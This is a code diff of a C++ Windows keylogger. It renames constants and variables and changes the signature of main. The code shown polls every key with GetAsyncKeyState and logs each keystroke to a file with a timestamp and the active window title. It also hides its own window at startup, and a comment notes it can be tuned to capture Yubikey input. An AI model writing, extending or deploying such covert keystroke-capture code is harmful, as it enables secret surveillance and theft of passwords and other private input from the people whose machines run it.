@@ -94,14 +94,14 @@ void setupStreams(char *buffer, const int length) {
 /**
  * Logs keystrokes from keybooard and dumps to file
  *
- * This function sleeps for SLEEP_IN_MILLSECONDS milliseconds to minimise
+ * This function sleeps for kSLEEP_IN_MILLSECONDS milliseconds to minimise
  * cpu usage.
  */
 void startLogging() {
-  const int TIMESTAMP_STR_LENGTH = 32;
-  const char *TIMESTAM_STR_FMT = "%Y-%m-%d_%H:%M:%S";
-  const int WINDOW_TITLE_LENGTH = 2048;
-  const int SLEEP_IN_MILLSECONDS = 10;
+  const int kTIMESTAMP_STR_LENGTH = 32;
+  const char *kTIMESTAM_STR_FMT = "%Y-%m-%d_%H:%M:%S";
+  const int kWINDOW_TITLE_LENGTH = 2048;
+  const int kSLEEP_IN_MILLSECONDS = 10;
 
   logfile << "TIME|KEY|WINDOW\n";
 
@@ -112,41 +112,40 @@ void startLogging() {
   std::map<std::int16_t, std::vector<std::string>>::const_iterator keyit;
 
   char *timestamp = (char *)calloc(  // NOLINT [readability/casting]
-      TIMESTAMP_STR_LENGTH, sizeof(char));
+      kTIMESTAMP_STR_LENGTH, sizeof(char));
   std::string character_key;
 
-  bool is_shift_key_pressed;
+  bool shift_key_is_pressed;
 
   // Windows handle & title
   HWND activeWindowHandler;
 
-  // TCHAR activeWindowTitle[WINDOW_TITLE_LENGTH];
   TCHAR *activeWindowTitle = (TCHAR *)calloc(  // NOLINT [readability/casting]
-      WINDOW_TITLE_LENGTH, sizeof(TCHAR));
+      kWINDOW_TITLE_LENGTH, sizeof(TCHAR));
 
   while (true) {
-    is_shift_key_pressed = false;
+    shift_key_is_pressed = false;
     activeWindowHandler = GetForegroundWindow();
 
     for (keyit = keys.begin(); keyit != keys.end(); ++keyit) {
       system_clock = std::chrono::system_clock::now();
       std::time_t system_time =
           std::chrono::system_clock::to_time_t(system_clock);
-      std::strftime(timestamp, TIMESTAMP_STR_LENGTH, TIMESTAM_STR_FMT,
+      std::strftime(timestamp, kTIMESTAMP_STR_LENGTH, kTIMESTAM_STR_FMT,
                     std::localtime(&system_time));
 
       std::int16_t key_state = GetAsyncKeyState(keyit->first);
       GetWindowText(activeWindowHandler, activeWindowTitle,
-                    WINDOW_TITLE_LENGTH);
+                    kWINDOW_TITLE_LENGTH);
 
       // Shift key is down. MSB is set.
       if (key_state == -32768 && keyit->first == 16) {
-        is_shift_key_pressed = true;
+        shift_key_is_pressed = true;
       }
 
       // Key state has changed. LSB is set.
       if (key_state == -32767) {
-        if (is_shift_key_pressed) {
+        if (shift_key_is_pressed) {
           // Handle Uppercase Characters
           logfile << timestamp << "|" << keyit->second[1] << "|\"";
           logfile << activeWindowTitle << "\"\n";
@@ -163,11 +162,14 @@ void startLogging() {
     // Sleep() requires WinXP or later (sleep 15 milliseconds)
     // Can be removed entirely to capture Yubikey, etc.
     // but may be CPU intensive
-    Sleep(SLEEP_IN_MILLSECONDS);
+    Sleep(kSLEEP_IN_MILLSECONDS);
   }
 }
 
-int main() {
+/**
+ *
+ */
+int main(int ARGC, char **ARGV) {
   hideWindow();
 
   const int filename_length = 120;
